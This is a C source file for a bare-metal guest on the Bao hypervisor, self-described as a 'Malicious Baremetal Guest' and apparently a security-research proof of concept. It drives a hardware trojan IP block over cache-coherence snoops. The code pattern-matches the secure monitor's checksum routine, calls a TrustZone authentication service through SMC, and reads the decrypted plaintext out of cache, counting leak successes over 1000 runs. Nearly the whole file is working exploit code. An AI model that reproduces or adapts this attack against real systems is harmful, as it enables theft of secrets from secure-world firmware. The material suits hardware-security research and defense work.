
/** 
 * Bao, a Lightweight Static Partitioning Hypervisor 
 *
 * Copyright (c) Bao Project (www.bao-project.org), 2019-
 *
 * Authors:
 *      Jose Martins <jose.martins@bao-project.org>
 *      Sandro Pinto <sandro.pinto@bao-project.org>
 *
 * Bao is free software; you can redistribute it and/or modify it under the
 * terms of the GNU General Public License version 2 as published by the Free
 * Software Foundation, with a special exception exempting guest code from such
 * license. See the COPYING file in the top-level directory for details. 
 *
 */

#include <core.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h> 
#include <cpu.h>
#include <wfi.h>
#include <spinlock.h>
#include <plat.h>
#include <irq.h>
#include <uart.h>
#include <timer.h>
#include <stdint.h>

#define TIMER_INTERVAL (TIME_S(1))

spinlock_t print_lock = SPINLOCK_INITVAL;

char* strnchr(const char* s, size_t n, char c) {
    for (size_t i = 0; i < n; i++) {
        if (s[i] == c) {
            return (char*)s + i;
        }
    }
    return NULL;
}

#define PSCI_CPU_ON            0xC4000003  // SMC function ID for PSCI_CPU_ON

static inline uint64_t smc_call(uint32_t smc_fid, uint64_t x1, uint64_t x2, uint64_t x3)
{
    register uint64_t result __asm__("x0") = smc_fid;
    register uint64_t r1 __asm__("x1") = x1;
    register uint64_t r2 __asm__("x2") = x2;
    register uint64_t r3 __asm__("x3") = x3;

    __asm__ volatile(
        "smc #0\n"
        : "+r"(result)
        : "r"(r1), "r"(r2), "r"(r3)
        : "memory"
    );

    return result;
}

// Control Reg bits
#define EN_pos      0
// #define RESERVED 1
#define FUNC_pos    5
    #define RESERVED1       0
    #define RESERVED2       1
    #define FUNC_ADL        2
    #define FUNC_ADT        3
#define CRRESP_pos  9
#define ACFLT_pos   14
#define ADDRFLT_pos 15
// #define RESERVED 16
// #define RESERVED 17
#define ADLEN_pos   18
#define ADTEN_pos   19
#define ONESHOT_pos 20
#define MONEN_pos   21
#define CMD_pos     22
    #define CMD_LEAK        0
    #define CMD_POISON      1
    #define CMD_TAMPER_CL   2
    #define CMD_DELAY_CR    3
    #define CMD_DEANON      4
    #define CMD_HOLD        5
    #define CMD_REDIRECT    6
    #define CMD_LEAK_TZ     7
    #define CMD_CLEAN       8
#define STENDEN_pos   26
#define SNEAKEN_pos   27

// Status Reg bits
#define OSH_END_pos 0
#define BUSY_pos 1
#define DEANON_COUNT_pos 2

#define READ_ONCE           0b0000
#define WRITE_LINE_UNIQUE   0b001
#define WRITE_BACK          0b011

#define READONCE_EN            0b0000000001
#define READSHARED_EN          0b0000000010
#define READCLEAN_EN           0b0000000100
#define READNOTSHAREDDIRTY_EN  0b0000001000
#define READUNIQUE_EN          0b0000010000
#define CLEANUNIQUE_EN         0b0000100000
#define MAKEUNIQUE_EN          0b0001000000
#define CLEANSHARED_EN         0b0010000000
#define CLEANINVALID_EN        0b0100000000
#define MAKEINVALIDE_EN        0b1000000000
#define ALL_EN                 0b1111111111

#define READONCE            0b0000 
#define READSHARED          0b0001 
#define READCLEAN           0b0010
#define READNOTSHAREDDIRTY  0b0011         
#define READUNIQUE          0b0111 
#define CLEANUNIQUE         0b1011 
#define MAKEUNIQUE          0b1100 
#define CLEANSHARED         0b1000 
#define CLEANINVALID        0b1001     
#define MAKEINVALIDE        0b1101     

struct devil_ip_regs {
    uint32_t ctrl;
    uint32_t status;
    uint32_t p_delay;
    uint32_t acsnoop;
    uint32_t base_addr;
    uint32_t mem_size;
    uint32_t arsnoop;
    uint32_t l_araddr;
    uint32_t h_araddr;
    uint32_t awsnoop;
    uint32_t l_awaddr;
    uint32_t h_awaddr;
    uint32_t reserved1;
    uint32_t reserved2;
    uint32_t reserved3;
    uint32_t reserved4;
    uint32_t DATA0;       
    uint32_t DATA1;           
    uint32_t DATA2;           
    uint32_t DATA3;           
    uint32_t DATA4;           
    uint32_t DATA5;           
    uint32_t DATA6;           
    uint32_t DATA7;           
    uint32_t DATA8;           
    uint32_t DATA9;           
    uint32_t DATA10;          
    uint32_t DATA11;          
    uint32_t DATA12;          
    uint32_t DATA13;          
    uint32_t DATA14;          
    uint32_t DATA15;   
    uint32_t PATTERN0;       
    uint32_t PATTERN1;           
    uint32_t PATTERN2;           
    uint32_t PATTERN3;           
    uint32_t PATTERN4;           
    uint32_t PATTERN5;           
    uint32_t PATTERN6;           
    uint32_t PATTERN7;           
    uint32_t PATTERN8;           
    uint32_t PATTERN9;           
    uint32_t PATTERN10;          
    uint32_t PATTERN11;          
    uint32_t PATTERN12;          
    uint32_t PATTERN13;          
    uint32_t PATTERN14;          
    uint32_t PATTERN15; 
    uint32_t PATTERN_SIZE; 
    uint32_t WORD_INDEX; 
    uint32_t END_PATTERN0;       
    uint32_t END_PATTERN1;           
    uint32_t END_PATTERN2;           
    uint32_t END_PATTERN3;           
    uint32_t END_PATTERN4;           
    uint32_t END_PATTERN5;           
    uint32_t END_PATTERN6;           
    uint32_t END_PATTERN7;           
    uint32_t END_PATTERN8;           
    uint32_t END_PATTERN9;           
    uint32_t END_PATTERN10;          
    uint32_t END_PATTERN11;          
    uint32_t END_PATTERN12;          
    uint32_t END_PATTERN13;          
    uint32_t END_PATTERN14;          
    uint32_t END_PATTERN15; 
    uint32_t END_PATTERN_SIZE; 
    uint32_t DEANON_ADDR_DATA; 
    uint32_t Sneak_target_snoop; 
    uint32_t Sneak_target_addr; 
    uint32_t Sneak_target_size; 
    uint32_t Sneak_addr; 
    uint32_t Sneak_snoop;
};

#define ARM_STD_SVC_UID			0x8400ff01
#define AUTHENTICATION_SERVICE  0x8400ff04

// -----------------------------------------------------------------------------
// AUTHENTICATION SERVICE related Code
// -----------------------------------------------------------------------------
#define AUTHENTICATION_SUCCESS 	0x1
#define AUTHENTICATION_FAIL 	0x0

uint8_t xor_key        = 0x5A;  

// XOR encryption and decryption (symmetric). This is is not a secure encryption
// algorithm, but it is enough for this demonstration. We just want to show that
// the NS sees the ciphertext in main memory, however, once decrypted, the a 
// coherent trojan can leak the data directly from cache and get the plaintext. 
// For this porpuse, using a simple encryption algorithm or a strong one, like 
// AES or chacha20 would yield the same result. Second, those algorithms would 
// require us to put them in S-EL1/0  as it wouldn't fit in the S-EL3 firmware 
// image. Third, this way we show that even the highest privileged level can be
// compromised.

void xor_cipher(uint8_t *data, uint32_t length, uint8_t key) {
    for (uint32_t i = 0; i < length; i++) {
        data[i] ^= key;
    }
}

// Basic Checksum to perform athentication (just for test porpuses, this is
// a very weak authentication method)
uint8_t checksum(uint8_t *plaintext) {
    uint8_t checksum = 0;
    for (int i = 0; i < 32; i++) {
        checksum ^= plaintext[i];
    }
    return checksum;
}

// ---------------------------------------------------------

uint8_t *ciphertext = (uint8_t*) 0x80000000;
uint8_t plaintext[32];

unsigned int *data  = (unsigned int*)(0x80010000+0x40);

int gen_cyphertext(char no_prints) {
    uint8_t decrypted[32] = {0};

    // Generate random plaintext using a simple pseudo-random sequence
    uint8_t seed = 0x55; 
    for (int i = 0; i < 32; i++) {
        seed ^= (i * 37 + 123) & 0xFF; // pseudo-random generator logic
        plaintext[i] = seed;
    }

    if (!no_prints){
        printf("\n");
        printf("Plaintext : ");
        for (int i = 0; i < 32; i++) {
            printf("%02x", plaintext[i]);
        }
        printf("\n");
    }

    // Copy plaintext for encryption
    memcpy(ciphertext, plaintext, 32);

    // Encrypt
    xor_cipher(ciphertext, 32, xor_key);

    // Print ciphertext
    if (!no_prints){
        printf("Ciphertext: ");
        for (int i = 0; i < 32; i++) {
            printf("%02x", ciphertext[i]);
        }
        printf("\n");
    }   

    // Basic Checksum to perform authentication (just for test purposes)
    uint8_t checksum = 0;
    for (int i = 0; i < 32; i++) {
        checksum ^= plaintext[i];
    }

    if (!no_prints)
        printf("Checksum: %02x\n", checksum);

    printf("\n");
    return checksum;
}


int config(char cmd) {

    int mem_fd;
    int counter = 0;
    struct devil_ip_regs *devil_ip = (struct devil_ip_regs *)0x80010000;

    // Monitor Checksum function
    devil_ip->PATTERN0  = 0xaa0003e2;
    devil_ip->PATTERN1  = 0xd2800001;
    devil_ip->PATTERN2  = 0x52800000;
    devil_ip->PATTERN3  = 0x38616843;
    devil_ip->PATTERN4  = 0x91000421;
    devil_ip->PATTERN5  = 0x4a000060;
    devil_ip->PATTERN6  = 0xf100803f;
    devil_ip->PATTERN7  = 0x54ffff81;
    
    devil_ip->PATTERN_SIZE = 8;

    // Configs for the Read Snoop the IP will issue
    devil_ip->Sneak_addr = 0xffffd000; 
    
    devil_ip->ctrl    =    (0b00001 << CRRESP_pos) // Shared = 1, Dirty = 0, Data = 1 
                        | (cmd << CMD_pos)        
                        | (1 << MONEN_pos)               
                        | (1<< EN_pos);
}

int success = 0;

int leak(char no_prints) {
    int mem_fd;
    int counter = 0;
    struct devil_ip_regs *devil_ip = (struct devil_ip_regs *)0x80010000;
    uint8_t leaked[32] = {0};

    uint32_t *data_ptr = &(devil_ip->DATA0);  // Point to the first data register

    for (int i = 0; i < 8; i++) {
        //printf("Data: 0x%08x\n", *(data_ptr + i));  // Print the current data
        for (int j = 0; j < 4; j++) {
            leaked[i * 4 + j] = (*(data_ptr + i) >> (j * 8)) & 0xFF;  // Extract bytes
        }
        for (int k = 0; k < 1000; k++);  // Delay
    }

    if (!no_prints){
        printf("\n");
        printf("Plaintext : ");
        for (int i = 0; i < 32; i++) {
            printf("%02x", plaintext[i]);
        }
        printf("\n");
    }
    if(!no_prints){
        printf("Leaked    : ");
        for (int i = 0; i < 32; i++) {
            printf("%02x", leaked[i]);
        }
        printf("\n");
    }

    if (memcmp(plaintext, leaked, 32) == 0) {
        success++;
        if(!no_prints)
            printf("Leak Success.\n");
    } else {
        if(!no_prints)
            printf("Leak Failed.\n");
    }
}

#define N_RUNS      1000
#define NO_PRINTS   0

void main(void){
    static volatile bool master_done = false;
    int checksum_value = 0;

    if(cpu_is_master()){
        spin_lock(&print_lock);
        printf("Malicious Baremetal Guest\n");
        spin_unlock(&print_lock);

        master_done = true;
    }

    while(!master_done);

    checksum_value = gen_cyphertext(NO_PRINTS);
    
    if(get_cpuid() == 0){
        config(CMD_LEAK_TZ);    
        for(uint32_t j = 0; j < N_RUNS; j++)
        {   
            if (smc_call(AUTHENTICATION_SERVICE, ciphertext , checksum_value, xor_key)) {
                printf("Authentication success\n\r");
            } else {
                printf("Authentication failed\n\r");
            }
            leak(NO_PRINTS); 
            printf("\n\r");
        }
        printf("Success Rate: %d%%\n", (success * 100) / N_RUNS);
    }

    while(1);
}